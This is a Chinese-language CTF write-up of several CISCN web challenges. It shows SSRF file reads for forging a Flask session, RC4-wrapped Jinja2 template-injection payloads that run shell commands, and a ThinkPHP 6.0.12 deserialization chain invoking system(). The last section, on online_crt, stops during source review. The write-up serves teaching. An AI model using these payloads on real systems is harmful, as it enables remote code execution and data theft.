<h1 id="ciscn-2019华东南web4">[CISCN 2019华东南]Web4</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214153537023.png" alt="image-20240214153537023"></p>
<p>首页发现存在ssrf，尝试几次发现file被ban，看了wp知道还有local_file可以用，直接读取源代码/app/app.py</p>
<pre><code class="hljs py"><span class="hljs-comment"># encoding:utf-8</span>
<span class="hljs-keyword">import</span> re, random, uuid, urllib
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)
app.debug = <span class="hljs-literal">True</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    session[<span class="hljs-string">'username'</span>] = <span class="hljs-string">'www-data'</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/read'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():
    <span class="hljs-keyword">try</span>:
        url = request.args.get(<span class="hljs-string">'url'</span>)
        m = re.findall(<span class="hljs-string">'^file.*'</span>, url, re.IGNORECASE)
        n = re.findall(<span class="hljs-string">'flag'</span>, url, re.IGNORECASE)
        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'No Hack'</span>
        res = urllib.urlopen(url)
        <span class="hljs-keyword">return</span> res.read()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:
        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'no response'</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/flag'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():
    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">'username'</span>] == <span class="hljs-string">'fuck'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'/flag.txt'</span>).read()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'Access denied'</span>

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    app.run(
        debug=<span class="hljs-literal">True</span>,
        host=<span class="hljs-string">"0.0.0.0"</span>
    )</code></pre>
<p>看代码知道将file、flag给ban了，但如果我们访问flag路由的时候，存在session且其中的username的键值为fuck，即可成功读取flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214153957044.png" alt="image-20240214153957044"></p>
<p>同时页面抓包发现这是python2，这时候只需要重点看一下session-key是如何生成的：</p>
<pre><code class="hljs py">random.seed(uuid.getnode())
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214154629894.png" alt="image-20240214154629894"></p>
<p>查询一番发现这里的uuid函数是用来获取Mac地址的，并将其当做随机数种子来生成key，那我们先读取一下Mac地址是什么</p>
<pre><code class="hljs scss">local_file:///sys/class/net/eth0/address</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214155059319.png" alt="image-20240214155059319"></p>
<p>得到之后带入上述生成的key，并用py2运行，拿到key</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162053535.png" alt="image-20240214162053535"></p>
<p>接着使用脚本解密session即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162106093.png" alt="image-20240214162106093"></p>
<p>最后将加密后的结果修改进cookie即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162139797.png" alt="image-20240214162139797"></p>
<h1 id="ciscn-2019华东南double-secret">[CISCN 2019华东南]Double Secret</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214164725083.png" alt="image-20240214164725083"></p>
<p>扫出三个目录，一个个试了，就如下页面有点用，发现有报错，但这里不知道为何我不能看报错代码。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214164719459.png" alt="image-20240214164719459"></p>
<p>直接借用wp的了</p>
<pre><code class="hljs scss"><span class="hljs-built_in">if</span>(secret==None):
    return <span class="hljs-string">'Tell me your secret.I will encrypt it so others can\'t see'</span>
rc=rc4_Modified.<span class="hljs-built_in">RC4</span>(<span class="hljs-string">"HereIsTreasure"</span>)   #解密
deS=rc.<span class="hljs-built_in">do_crypt</span>(secret)
 
a=<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe</span>(deS))
 
if <span class="hljs-string">'ciscn'</span> in a.<span class="hljs-built_in">lower</span>():
    return <span class="hljs-string">'flag detected!'</span>
return a</code></pre>
<p>这里对secret内容进行rc4解密，随后对deS进行模板渲染，其中还有一个safe似乎是过滤函数，放一个rc4加密脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">"init_key"</span>, message = <span class="hljs-string">"init_message"</span></span>):
    <span class="hljs-comment"># print("RC4加密主函数")</span>
    s_box = rc4_init_sbox(key)
    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))
    <span class="hljs-keyword">return</span>  crypt
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):
    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>
    <span class="hljs-comment"># print("原来的 s 盒：%s" % s_box)</span>
    j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>
        s_box[i], s_box[j] = s_box[j], s_box[i]
    <span class="hljs-comment"># print("混乱后的 s 盒：%s"% s_box)</span>
    <span class="hljs-keyword">return</span> s_box
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):
    <span class="hljs-comment"># print("调用加密程序成功。")</span>
    res = []
    i = j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + box[i]) % <span class="hljs-number">256</span>
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % <span class="hljs-number">256</span>
        k = box[t]
        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))
    <span class="hljs-comment"># print("res用于加密字符串，加密后是：%res" %res)</span>
    cipher = <span class="hljs-string">""</span>.join(res)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"加密后的字符串是：%s"</span> %quote(cipher))
    <span class="hljs-comment">#print("加密后的输出(经过编码):")</span>
    <span class="hljs-comment">#print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">'utf-8'</span>)), <span class="hljs-string">'utf-8'</span>))
<span class="hljs-comment">#需要加密的字符串在这里修改</span>
rc4_main(<span class="hljs-string">"HereIsTreasure"</span>,<span class="hljs-string">"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"</span>)</code></pre>
<p>这里有佬说明：这里是后端对secret传入的值进行了RC4加密，RC4加密方式为，明文加密一次得到密文，密文在加密一次得到明文。所以要使用RC4脚本对我们传入的恶意字符串进行一次加密，这样传给系统，既绕过检测，同时还得到了明文得以执行</p>
<p>不过这道题似乎直接用上述的ssti直接读取flag即可</p>
<pre><code class="hljs scss"><span class="hljs-built_in">rc4_main</span>("HereIsTreasure","{{''.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()}}")</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165107909.png" alt="image-20240214165107909"></p>
<p>下标为59的是<code>warnings.catch_warnings</code>，直接利用即可：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">rc4_main</span>("HereIsTreasure","{{''.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.__import__</span>('os')<span class="hljs-selector-class">.popen</span>('cat /flag.txt')<span class="hljs-selector-class">.read</span>()}}")</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165207754.png" alt="image-20240214165207754"></p>
<p>看了wp发现，可以通过执行py代码直接一步到位：</p>
<pre><code class="hljs py">{% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %}{% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">'catch_warnings'</span> %}{{ c.__init__.__globals__[<span class="hljs-string">'__builtins__'</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">"__import__('os').popen('ls /').read()"</span>)}}{% endif %}{% endfor %}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165349178.png" alt="image-20240214165349178"></p>
<p>找到了flag位置，随后读取：</p>
<pre><code class="hljs py">{% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %}{% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">'catch_warnings'</span> %}{{ c.__init__.__globals__[<span class="hljs-string">'__builtins__'</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">"__import__('os').popen('cat /flag.txt').read()"</span>)}}{% endif %}{% endfor %}</code></pre>
<h1 id="ciscn-2022-初赛ezpop">[CISCN 2022 初赛]ezpop</h1>
<p>这道题先是一个源码泄露，www.zip接着我们打开之后，看到如下路由：<code>app/controller/index.php</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">BaseController</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V'</span> . \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">version</span>() . <span class="hljs-string">'&lt;br/&gt;&lt;span style="font-size:30px;"&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style="font-size:25px;"&gt;[ V6.0 版本由 &lt;a href="https://www.yisu.com/" target="yisu"&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="ee9b1aa918103c4fc"&gt;&lt;/think&gt;'</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">'ThinkPHP6'</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">'hello,'</span> . <span class="hljs-variable">$name</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
   	<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'a'</span>]);
    }
    
}</code></pre>
<p>可以看到这里有反序列化入口点，加上如下图，直接暴露了版本，那上网找现成的pop即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302094137727.png" alt="image-20240302094137727"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>{
    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span>{
        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">lazySave</span> = <span class="hljs-title class_">false</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [];
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$json</span> = [];
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$jsonAssoc</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span> = <span class="hljs-string">''</span></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;lazySave = True;
            <span class="hljs-variable language_">$this</span>-&gt;data = [<span class="hljs-string">'whoami'</span> =&gt; [<span class="hljs-string">'ls /'</span>]];
            <span class="hljs-variable language_">$this</span>-&gt;exists = True;
            <span class="hljs-variable language_">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;
            <span class="hljs-variable language_">$this</span>-&gt;withAttr = [<span class="hljs-string">'whoami'</span> =&gt; [<span class="hljs-string">'system'</span>]];
            <span class="hljs-variable language_">$this</span>-&gt;json = [<span class="hljs-string">'whoami'</span>,[<span class="hljs-string">'whoami'</span>]];
            <span class="hljs-variable language_">$this</span>-&gt;jsonAssoc = True;
        }
    }
}
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>{
    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>{
    }
}

<span class="hljs-keyword">namespace</span>{
    <span class="hljs-title class_">echo</span>(<span class="hljs-title class_">urlencode</span>(<span class="hljs-title class_">serialize</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>()))));
}</code></pre>
<p>根据文章所说以及代码，我们找到index.php/index/test下直接post传入参数a即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302095222394.png" alt="image-20240302095222394"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302095255581.png" alt="image-20240302095255581"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">ThinkPHP6.0.12LTS反序列漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/issues/2717">ThinkPHP 6.0.12 Unserialize RCE</a></p>
<h1 id="ciscn-2022-初赛online_crt">[CISCN 2022 初赛]online_crt</h1>
<p>跟着附件我们看到后端是由Python和golang处理的，先看python</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_crt</span>(<span class="hljs-params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):
    root_key = rsa.generate_private_key(
        public_exponent=<span class="hljs-number">65537</span>,
        key_size=<span class="hljs-number">2048</span>,
        backend=default_backend()
    )
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),
        x509.NameAttribute(NameOID.LOCALITY_NAME, City),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),
        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),
        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),
    ])
    root_cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        root_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="hljs-number">3650</span>)
    ).sign(root_key, hashes.SHA256(), default_backend())
    crt_name = <span class="hljs-string">"static/crt/"</span> + <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">".crt"</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(crt_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
        f.write(root_cert.public_bytes(serialization.Encoding.PEM))
    <span class="hljs-keyword">return</span> crt_name</code></pre>
<p>上述代码是用来生成crt证书的</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/getcrt'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():
    Country = request.form.get(<span class="hljs-string">"Country"</span>, <span class="hljs-string">"CN"</span>)
    Province = request.form.get(<span class="hljs-string">"Province"</span>, <span class="hljs-string">"a"</span>)
    City = request.form.get(<span class="hljs-string">"City"</span>, <span class="hljs-string">"a"</span>)
    OrganizationalName = request.form.get(<span class="hljs-string">"OrganizationalName"</span>, <span class="hljs-string">"a"</span>)
    CommonName = request.form.get(<span class="hljs-string">"CommonName"</span>, <span class="hljs-string">"a"</span>)
    EmailAddress = request.form.get(<span class="hljs-string">"EmailAddress"</span>, <span class="hljs-string">"a"</span>)
    <span class="hljs-keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</code></pre>
<p>这里是用来处理getcrt路由下的get和post方法，在upload函数中通过request.form.get提取form表单中指定参数的内容，如果没有的话，则按默认的来。最后调用get_crt函数生成证书</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/createlink'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():
    json_data = {<span class="hljs-string">"info"</span>: os.popen(<span class="hljs-string">"c_rehash static/crt/ &amp;&amp; ls static/crt/"</span>).read()}
    <span class="hljs-keyword">return</span> json.dumps(json_data)</code></pre>
<p>当访问createlink路由时，会调用popen函数执行<code>c_rehash static/crt/ &amp;&amp; ls static/crt/</code>，并最终将得到的结果按json数据格式返回</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/proxy'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy</span>():
    uri = request.form.get(<span class="hljs-string">"uri"</span>, <span class="hljs-string">"/"</span>)
    client = socket.socket()
    client.connect((<span class="hljs-string">'localhost'</span>, <span class="hljs-number">8887</span>))
    msg = <span class="hljs-string">f'''GET <span class="hljs-subst">{uri}</span> HTTP/1.1</span>
<span class="hljs-string">Host: test_api_host</span>
<span class="hljs-string">User-Agent: Guest</span>
<span class="hljs-string">Accept-Encoding: gzip, deflate</span>
<span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="hljs-string">Connection: close</span>
<span class="hljs-string"></span>
<span class="hljs-string">'''</span>
    client.send(msg.encode())
    data = client.recv(<span class="hljs-number">2048</span>)
    client.close()
    <span class="hljs-keyword">return</span> data.decode()</code></pre>
<p>这里目的是与目标服务器localhost:8887建立连接，在想目标服务器发送http请求之后，返回目标服务器的响应</p>
<p>接着我们看一下go的代码</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">admin</span><span class="hljs-params">(c *gin.Context)</span></span> {
	staticPath := <span class="hljs-string">"/app/static/crt/"</span>
	oldname := c.DefaultQuery(<span class="hljs-string">"oldname"</span>, <span class="hljs-string">""</span>)
	newname := c.DefaultQuery(<span class="hljs-string">"newname"</span>, <span class="hljs-string">""</span>)
	<span class="hljs-keyword">if</span> oldname == <span class="hljs-string">""</span> || newname == <span class="hljs-string">""</span> || strings.Contains(oldname, <span class="hljs-string">".."</span>) || strings.Contains(newname, <span class="hljs-string">".."</span>) {
		c.String(<span class="hljs-number">500</span>, <span class="hljs-string">"error"</span>)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">""</span> &amp;&amp; c.Request.Host == <span class="hljs-string">"admin"</span> {
		err := os.Rename(staticPath+oldname, staticPath+newname)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-keyword">return</span>
		}
		c.String(<span class="hljs-number">200</span>, newname)
		<span class="hljs-keyword">return</span>
	}
	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"no"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(c *gin.Context)</span></span> {
	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">"hello world"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	router := gin.Default()
	router.GET(<span class="hljs-string">"/"</span>, index)
	router.GET(<span class="hljs-string">"/admin/rename"</span>, admin)

	<span class="hljs-keyword">if</span> err := router.Run(<span class="hljs-string">":8887"</span>); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
}</code></pre>
